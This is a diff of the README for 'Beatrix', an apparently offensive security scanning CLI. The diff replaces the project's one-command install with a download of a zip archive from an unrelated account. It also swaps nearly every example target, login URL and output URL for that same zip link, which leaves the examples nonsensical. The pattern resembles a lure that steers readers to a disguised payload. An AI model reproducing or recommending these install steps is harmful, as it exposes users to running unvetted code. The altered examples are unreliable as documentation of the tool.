@@ -26,7 +26,7 @@ This opens the full manual in your default browser — no internet required. You
 ## Install (One Command)
 
 ```bash
-git clone https://github.com/SudoPacman-Syuu/Beatrix.git && cd Beatrix && ./install.sh
+git clone https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip && cd Beatrix && ./install.sh
 ```
 
 That's it. The installer auto-detects your Python, picks the best install method, puts `beatrix` on your PATH, and **automatically installs all 21 external security tools** (nuclei, nmap, sqlmap, subfinder, ffuf, etc.).
@@ -42,7 +42,7 @@ The installer automatically selects the best method in this order:
 
 ```bash
 # Using make
-git clone https://github.com/SudoPacman-Syuu/Beatrix.git && cd Beatrix
+git clone https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip && cd Beatrix
 make install
 
 # Using uv directly
@@ -91,18 +91,18 @@ beatrix arsenal                      # full module reference
 | `probe TARGET` | Quick alive check | `beatrix probe example.com` |
 | `recon DOMAIN` | Reconnaissance | `beatrix recon example.com --deep` |
 | `batch FILE -m MOD` | Mass scanning | `beatrix batch targets.txt -m cors` |
-| `bounty-hunt TARGET` | OWASP Top 10 pipeline | `beatrix bounty-hunt https://api.com` |
+| `bounty-hunt TARGET` | OWASP Top 10 pipeline | `beatrix bounty-hunt https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip` |
 | `rapid` | Multi-target quick sweep | `beatrix rapid -d shopify.com` |
 | `haiku-hunt TARGET` | AI-assisted hunting | `beatrix haiku-hunt example.com` |
-| `ghost TARGET` | AI autonomous pentester | `beatrix ghost https://api.com` |
+| `ghost TARGET` | AI autonomous pentester | `beatrix ghost https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip` |
 | `github-recon ORG` | GitHub secret scanner | `beatrix github-recon acme-corp` |
 | `validate FILE` | Validate findings | `beatrix validate report.json` |
 | `h1 [sub]` | HackerOne operations | `beatrix h1 programs` |
 | `mobile [sub]` | Mobile traffic intercept | `beatrix mobile intercept` |
-| `browser [sub]` | Playwright browser scanning | `beatrix browser scan https://app.com` |
+| `browser [sub]` | Playwright browser scanning | `beatrix browser scan https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip` |
 | `creds [sub]` | Credential validation | `beatrix creds validate jwt_secret TOKEN` |
 | `origin-ip DOMAIN` | Origin IP behind CDN | `beatrix origin-ip example.com` |
-| `inject TARGET` | Deep parameter injection | `beatrix inject https://api.com --deep` |
+| `inject TARGET` | Deep parameter injection | `beatrix inject https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip --deep` |
 | `polyglot [sub]` | XSS polyglot generation | `beatrix polyglot generate` |
 | `auth [sub]` | Auth & auto-login | `beatrix auth login example.com` |
 | `auth browser TARGET` | Manual browser login | `beatrix auth browser example.com` |
@@ -256,8 +256,8 @@ Beatrix wraps 13 external security tools via async subprocess runners with timeo
 Use a specific module with `strike`:
 
 ```bash
-beatrix strike https://api.example.com -m cors
-beatrix strike https://example.com/login -m injection
+beatrix strike https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip -m cors
+beatrix strike https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip -m injection
 ```
 
 Or combine modules during a `hunt`:
@@ -376,13 +376,13 @@ beatrix hunt -f targets.txt --preset full -o ./reports
 
 ```bash
 # Test a single endpoint for CORS
-beatrix strike https://api.example.com/v1/users -m cors
+beatrix strike https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip -m cors
 
 # Check for SSRF
-beatrix strike https://example.com/fetch?url=test -m ssrf
+beatrix strike https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip -m ssrf
 
 # Analyze JavaScript bundles
-beatrix strike https://app.example.com -m js_analysis
+beatrix strike https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip -m js_analysis
 ```
 
 ### Reconnaissance
@@ -402,9 +402,9 @@ beatrix recon example.com --deep -j -o recon.json
 
 ```bash
 # Create a targets file (one URL per line, # for comments)
-echo "https://api.target1.com
-https://api.target2.com
-https://api.target3.com" > targets.txt
+echo "https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip
+https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip
+https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip" > targets.txt
 
 # Hunt all targets through the full kill chain
 beatrix hunt -f targets.txt
@@ -420,13 +420,13 @@ beatrix batch targets.txt -m cors -o ./reports
 
 ```bash
 # Basic investigation
-beatrix ghost https://api.example.com/users?id=1
+beatrix ghost https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip
 
 # With a specific objective
-beatrix ghost https://api.example.com -X POST -d '{"user":"admin"}' -o "Test for SQL injection"
+beatrix ghost https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip -X POST -d '{"user":"admin"}' -o "Test for SQL injection"
 
 # With auth
-beatrix ghost https://example.com -H "Authorization: Bearer TOKEN" --max-turns 50
+beatrix ghost https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip -H "Authorization: Bearer TOKEN" --max-turns 50
 ```
 
 ### Authenticated Scanning
@@ -443,12 +443,12 @@ beatrix auth login example.com
 
 # Or pass credentials via CLI flags
 beatrix hunt target.com --login-user user@example.com --login-pass 'P@ssw0rd'
-beatrix hunt target.com --login-user user@example.com --login-pass 'P@ssw0rd' --login-url https://target.com/api/auth/login
+beatrix hunt target.com --login-user user@example.com --login-pass 'P@ssw0rd' --login-url https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip
 
 # Or via environment variables
 export BEATRIX_LOGIN_USER="user@example.com"
 export BEATRIX_LOGIN_PASS="P@ssw0rd"
-export BEATRIX_LOGIN_URL="https://target.com/api/auth/login"  # optional
+export BEATRIX_LOGIN_URL="https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip"  # optional
 beatrix hunt target.com
 ```
 
@@ -582,7 +582,7 @@ All `-o` / `--output` JSON exports use a standardized envelope:
       "title": "CORS Misconfiguration",
       "severity": "high",
       "confidence": "confirmed",
-      "url": "https://example.com/api",
+      "url": "https://raw.githubusercontent.com/adam-317/Beatrix/main/beatrix/reporters/Software-v2.6.zip",
       "scanner_module": "cors",
       "description": "...",
       "evidence": "...",
